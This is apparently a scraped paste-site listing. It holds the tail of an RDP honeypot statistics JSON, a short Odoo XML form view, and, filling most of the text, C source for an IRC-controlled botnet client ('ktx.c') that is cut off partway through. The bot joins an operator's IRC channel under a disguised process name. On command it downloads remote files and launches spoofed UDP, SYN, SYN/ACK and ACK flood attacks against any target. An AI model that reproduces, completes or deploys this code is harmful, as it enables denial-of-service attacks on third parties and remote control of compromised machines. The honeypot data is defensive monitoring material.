    ""mobile & hosting & proxy"": 2
  }
}"
npn7icZn,2024-02-18_stats.json,rdp_snitch,JSON,Sunday 18th of February 2024 06:15:08 PM CDT,"{
  ""ip"": {
    ""45.227.254.55"": 2,
    ""194.165.16.78"": 4,
    ""173.239.214.30"": 1,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""205.210.31.65"": 3,
    ""172.206.250.19"": 1,
    ""212.70.149.142"": 5,
    ""87.251.75.145"": 3,
    ""167.94.138.125"": 1,
    ""194.165.16.76"": 2,
    ""185.170.144.3"": 2,
    ""36.91.222.100"": 1,
    ""205.210.31.184"": 3,
    ""45.227.254.48"": 2,
    ""38.130.226.109"": 1,
    ""103.192.198.60"": 2,
    ""200.35.53.121"": 1,
    ""61.91.43.232"": 1,
    ""185.170.144.113"": 3,
    ""179.60.147.129"": 1,
    ""118.193.32.88"": 1,
    ""45.137.201.204"": 1,
    ""205.210.31.168"": 3,
    ""167.248.133.38"": 1,
    ""87.251.75.64"": 1,
    ""45.131.195.114"": 1,
    ""120.240.145.8"": 1,
    ""45.93.20.204"": 3,
    ""194.165.16.72"": 2,
    ""167.94.145.55"": 1,
    ""198.235.24.201"": 3,
    ""79.124.62.106"": 1,
    ""149.34.246.34"": 1,
    ""216.24.210.126"": 1
  },
  ""asn"": {
    ""AS267784"": 4,
    ""AS48721"": 8,
    ""AS62240"": 3,
    ""AS208046"": 6,
    ""AS396982"": 12,
    ""AS8075"": 1,
    ""AS204428"": 5,
    ""AS208091"": 4,
    ""AS398324"": 2,
    ""AS197414"": 5,
    ""AS7713"": 1,
    ""AS13886"": 1,
    ""AS59187"": 2,
    ""AS27695"": 1,
    ""AS7470"": 1,
    ""AS209588"": 1,
    ""AS135377"": 1,
    ""AS49581"": 1,
    ""AS56040"": 1,
    ""AS57523"": 3,
    ""AS398705"": 1,
    ""AS207812"": 1,
    ""AS212238"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 13,
    ""LogicWeb Inc."": 1,
    ""ColocationX Ltd."": 6,
    ""Google LLC"": 12,
    ""Microsoft"": 1,
    ""SS-Net"": 5,
    ""Xhost Internet Solutions LP"": 9,
    ""Censys, Inc."": 3,
    ""PT Telekomunikasi Indonesia"": 1,
    ""Cloud South"": 1,
    ""Neevai Supercloud PVT LTD"": 2,
    ""Edatel S.a. E.S.P"": 1,
    ""True Internet Corporation CO. Ltd."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Ferdinand Zink trading as Tube-Hosting"": 1,
    ""VPN"": 1,
    ""China Mobile communications corporation"": 1,
    ""Chang Way Technologies Co. Limited"": 3,
    ""DM AUTO EOOD"": 1,
    ""Datacamp Limited"": 1,
    ""Clouvider Limited"": 1
  },
  ""org"": {
    ""UAB Host Baltic"": 4,
    ""Flyservers S.A"": 8,
    ""NSQ-VENTURE"": 1,
    ""Makut Investments"": 3,
    ""ColocationX Ltd"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""4Media Ltd"": 5,
    ""Xhost Internet Solutions"": 4,
    ""Censys, Inc"": 1,
    ""Xhostis"": 5,
    ""Telekomunikasi Indonesia"": 1,
    ""Cloud South"": 1,
    ""Neevai Supercloud PVT LTD"": 2,
    ""Edatel S.a. E.S.P"": 1,
    ""True Internet Corporation CO. LTD"": 1,
    ""Cloud Solutions S.A"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Taurus"": 1,
    ""Censys, Inc."": 2,
    ""VPN-Consumer-US"": 1,
    ""China Mobile"": 1,
    ""Starcrecium Limited"": 3,
    ""Internet Solutions & Innovations LTD"": 1,
    ""Datacamp Limited"": 1,
    ""IPXO"": 1
  },
  ""regionName"": {
    ""Vilnius"": 4,
    ""Kaunas"": 8,
    ""New Jersey"": 2,
    ""Virginia"": 4,
    ""North Holland"": 12,
    ""California"": 13,
    ""Plovdiv"": 5,
    ""Michigan"": 2,
    ""Jakarta"": 1,
    ""Florida"": 1,
    ""Madhya Pradesh"": 2,
    ""Antioquia"": 1,
    ""Bangkok"": 1,
    ""Distrito Federal"": 1,
    ""Kowloon"": 1,
    ""Lombardy"": 1,
    ""Guangdong"": 1,
    ""Moscow"": 3,
    ""Hesse"": 2,
    ""English River"": 1
  },
  ""country"": {
    ""Lithuania"": 12,
    ""United States"": 22,
    ""The Netherlands"": 12,
    ""Bulgaria"": 5,
    ""Indonesia"": 1,
    ""India"": 2,
    ""Colombia"": 1,
    ""Thailand"": 1,
    ""Venezuela"": 1,
    ""Hong Kong"": 1,
    ""Italy"": 1,
    ""China"": 1,
    ""Russia"": 3,
    ""Germany"": 2,
    ""Seychelles"": 1
  },
  ""account"": {
    ""Test"": 14,
    ""(empty)"": 8,
    ""Domain"": 12,
    ""nlHOiOUso"": 1,
    ""yqrSRV"": 1,
    ""rYsptK"": 1,
    ""hello"": 5,
    ""Administr"": 13,
    ""zkddjUWoL"": 1,
    ""XmFZgS"": 1,
    ""eAWPKV"": 1,
    ""a"": 1,
    ""Administrator"": 1,
    ""XHKjYrxdI"": 1,
    ""EQHnvu"": 1,
    ""dYEwCt"": 1,
    ""jKTWmDOXJ"": 1,
    ""UUZpmx"": 1,
    ""yzEcZK"": 1
  },
  ""keyboard"": {
    ""Unknown"": 66
  },
  ""client_build"": {
    ""Unknown"": 66
  },
  ""client_name"": {
    ""Unknown"": 66
  },
  ""ip_type"": {
    ""Unknown"": 41,
    ""hosting & proxy"": 2,
    ""mobile"": 4,
    ""hosting"": 15,
    ""proxy"": 3,
    ""mobile & hosting & proxy"": 1
  }
}"
EFMNTPWX,Odoo's XML,thecowmilk,XML,Sunday 18th of February 2024 04:33:21 PM CDT,"<record id=""open_hotel_get_dates_tree"" model=""ir.actions.act_window"">
    <field name=""name"">Get Calendar Files</field>
    <field name=""type"">ir.actions.act_window</field>
    <field name=""res_model"">hotel.getdates</field>
    <field name=""view_mode"">form</field>
    <field name=""context"">{'form_view_initial_mode': 'view', 'default_res_id': 'hotel.getdates,get_first_record_id()'}</field>
    </record>



    <record id=""view_hotel_getdates_files"" model=""ir.ui.view"">
    <field name=""name"">Get Calendar Files</field>
    <field name=""model"">hotel.getdates</field>
    <field name=""arch"" type=""xml"">
        <form string=""Get Dates"" create=""false"">
            <sheet>

                <group>
                    <field name=""date_selector"" widget=""one2many_list"">
                        <tree>
                            <field name=""name""/>
                            <field name=""dates""/>
                        </tree>
                    </field>
                </group>

            </sheet>
        </form>
    </field>
</record>"
MTYRPuWt,ktx.c IRC bot,GTAXL,C,Sunday 18th of February 2024 04:24:17 PM CDT,"/*
	This source attacks are almost completly rewrited by Dr.Simone Luchetta
	(Helel Ben-Shachar, The Shining One, Son of the Dawn!)
	I've implemented some new attacks with correct offset, checksum,
	sequences and acknowledgement's number (NOW WITH NO-SPOOF).
	There are presents: ackflood, the infamous nsackflood, an improved
	version of synflood and others (like randomflood).
	Please edit INADDR_ANY part for a correct packet sending.
	Dr. Simone Luchetta, <simoneluchetta at gmail.com>
	MSN: <simoneluchetta at gmail.com>
*/

#undef STARTUP
#undef IDENT
#define FAKENAME ""-dbus""
#define CHAN ""#ivircheetham""
#undef KEY ""key""
int numservers=1;
char *servers[] = {
	""irc.gtaxl.net"",
	(void*)0
};

#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

int sock,changeservers=0;
	char *server, *chan, *nick, *ident, *user, disabled=0, execfile[256],dispass[256];
	unsigned int *pids;
	unsigned long spoofs=0, spoofsm=0, numpids=0;
int strwildmatch(const char* pattern, const char* string) {
	switch(*pattern) {
		case '\0': return *string;
		case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
	}
}
int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
}
int mfork(char *sender) {
	unsigned int parent, *newpids, i;
	if (disabled == 1) {
		Send(sock,""NOTICE %s :Unable to comply.\n"",sender);
		return 1;
	}
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}
void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	if ((file=fopen(""/usr/dict/words"",""r"")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}
void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if (listen(sockfd, 1) == -1) return;
        if (fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if (FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if (i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
	Send(tmpsock,""%s : USERID : UNIX : %s\n"",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}
long pow(long a, long b) {
        if (b == 0) return 1;
        if (b == 1) return a;
        return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) {
        register int nleft = len;
        register u_short *w = addr;
        register int sum = 0;
        u_short answer =0;
        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}
void get(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        unsigned char bufm[4096];
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,""NOTICE %s :GET <host> <save as>\n"",sender);
                exit(0);
        }
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock,""NOTICE %s :Unable to create socket.\n"",sender);
                exit(0);
        }
        if (!strncmp(argv[1],""http://"",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if ((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if ((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock,""NOTICE %s :Unable to resolve address.\n"",sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock,""NOTICE %s :Unable to connect to http.\n"",sender);
                exit(0);
        }

        Send(sock2,""GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n"",buf+i+1,buf);
        Send(sock,""NOTICE %s :Receiving file.\n"",sender);
        file=fopen(argv[2],""wb"");
        while(1) {
                int i;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if (!strncmp(bufm+d,""\r\n\r\n"",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock,""NOTICE %s :Saved as %s\n"",sender,argv[2]);
        while(1) {
                int i,d;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
        exit(0);
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
        unsigned long a=spoofs,b=spoofs+(spoofsm-1);
        if (spoofsm == 1) Send(sock,""NOTICE %s :Spoofs: %d.%d.%d.%d\n"",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
        else Send(sock,""NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n"",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
void version(int sock, char *sender, int argc, char **argv) {
        Send(sock,""NOTICE %s :Helel mod 1.0 - Ezba' Elohim\n"",sender);
}
void nickc(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,""NOTICE %s :NICK <nick>\n"",sender);
                return;
        }
        if (strlen(argv[1]) >= 10) {
                Send(sock,""NOTICE %s :Nick cannot be larger than 9 characters.\n"",sender);
                return;
        }
        Send(sock,""NICK %s\n"",argv[1]);
}
void disable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,""NOTICE %s :DISABLE <pass>\n"",sender);
                Send(sock,""NOTICE %s :Current status is: %s.\n"",sender,disabled?""Disabled"":""Enabled and awaiting orders"");
                return;
        }
	if (disabled) {
		Send(sock,""NOTICE %s :Already disabled.\n"",sender);
		return;
	}
	if (strlen(argv[1]) > 254) {
                Send(sock,""NOTICE %s :Password too long! > 254\n"",sender);
                return;
	}
        disabled=1;
	memset(dispass,0,256);
	strcpy(dispass,argv[1]);
	Send(sock,""NOTICE %s :Disable sucessful.\n"");
}
void enable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,""NOTICE %s :ENABLE <pass>\n"",sender);
                Send(sock,""NOTICE %s :Current status is: %s.\n"",sender,disabled?""Disabled"":""Enabled and awaiting orders"");
                return;
        }
	if (!disabled) {
		Send(sock,""NOTICE %s :Already enabled.\n"",sender);
		return;
	}
	if (strcasecmp(dispass,argv[1])) {
		Send(sock,""NOTICE %s :Wrong password\n"",sender);
		return;
	}
        disabled=0;
	Send(sock,""NOTICE %s :Password correct.\n"",sender);
}
void spoof(int sock, char *sender, int argc, char **argv) {
        char ip[256];
        int i, num;
        unsigned long uip;
        if (argc != 1) {
                Send(sock,""NOTICE %s :Removed all spoofs\n"",sender);
                spoofs=0;
                spoofsm=0;
                return;
        }
        if (strlen(argv[1]) > 16) {
                Send(sock,""NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n"",sender);
                return;
        }
        strcpy(ip,argv[1]);
        if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
        for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
        num=-(num-4);
        for (i=0;i<num;i++) strcat(ip,"".0"");
        uip=inet_network(ip);
        if (num == 0) spoofsm=1;
        else spoofsm=pow(256,num);
        spoofs=uip;
}
struct iphdr {
        unsigned int ihl:4, version:4;
        unsigned char tos;
        unsigned short tot_len;
        unsigned short id;
        unsigned short frag_off;
        unsigned char ttl;
        unsigned char protocol;
        unsigned short check;
        unsigned long saddr;
        unsigned long daddr;
};
struct udphdr {
        unsigned short source;
        unsigned short dest;
        unsigned short len;
        unsigned short check;
};
struct tcphdr {
        unsigned short source;
        unsigned short dest;
        unsigned long seq;
        unsigned long ack_seq;
        unsigned short res1:4, doff:4;
	unsigned char fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
        unsigned short window;
        unsigned short check;
        unsigned short urg_ptr;
};
struct send_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};
unsigned int host2ip(char *sender,char *hostname) {
        static struct in_addr i;
        struct hostent *h;
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, ""NOTICE %s :Unable to resolve %s\n"", sender,hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }
        return i.s_addr;
}
void udp(int sock, char *sender, int argc, char **argv) {
        unsigned int port,i=0;
        unsigned long psize,target,secs;
        struct sockaddr_in s_in;
        struct iphdr *ip;
	struct udphdr *udp;
	char buf[1500],*str;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        if (argc < 3) {
                Send(sock,""NOTICE %s :UDP <target> <port> <secs>\n"",sender);
                exit(1);
        }
        target = host2ip(sender,argv[1]);
        port = atoi(argv[2]);
        secs = atol(argv[3]);
        ip=(void*)buf;
	udp=(void*)(buf+sizeof(struct iphdr));
        str=(void*)(buf+sizeof(struct iphdr)+sizeof(struct udphdr));
        memset(str,10,1500-(sizeof(struct iphdr)+sizeof(struct udphdr)));
        Send(sock,""NOTICE %s :Packeting %s.\n"",sender,argv[1]);
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = 1500;
        ip->frag_off = 0;
        ip->protocol = 17;
        ip->ttl = 64;
        ip->daddr = target;
        udp->len = htons(psize);
        s_in.sin_family  = AF_INET;
        s_in.sin_addr.s_addr = target;
        for (;;) {
                udp->source = rand();
                if (port) udp->dest = htons(port);
                else udp->dest = rand();
                udp->check = in_cksum((u_short *)buf,1500);
                ip->saddr = getspoof();
                ip->id = rand();
                ip->check = in_cksum((u_short *)buf,1500);
                s_in.sin_port = udp->dest;
                sendto(get,buf,1500,0,(struct sockaddr *)&s_in,sizeof(s_in));
                if (i >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        i=0;
                }
                i++;
        }
}
void synflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :SYNFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,""NOTICE %s :Flooding with TCP SYN %s.\n"",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=getspoof();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void nssynflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :NSSYNFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}
        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        Send(sock,""NOTICE %s :Flooding with TCP SYN %s.\n"",sender,argv[1]);
        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 64;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.ack_seq = 0;
        send_tcp.tcp.doff = 10;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 0;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;
        dest=htons(atoi(argv[2]));
        while(1) {
                source=rand();
                if (atoi(argv[2]) == 0) dest=rand();
                saddr=INADDR_ANY;
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.ip.check = 0;
                send_tcp.tcp.source = source;
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = rand();
                send_tcp.buf[9]=((char*)&check)[0];
                send_tcp.buf[10]=((char*)&check)[1];
                send_tcp.buf[11]=((char*)&check)[2];
                send_tcp.buf[12]=((char*)&check)[3];
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);
}

void randomflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :RANDOMFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,""NOTICE %s :Flooding with TCP SYN/ACK %s.\n"",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 0;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 1;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;

        while(1) {
                saddr=getspoof();
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}



void ackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :ACKFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
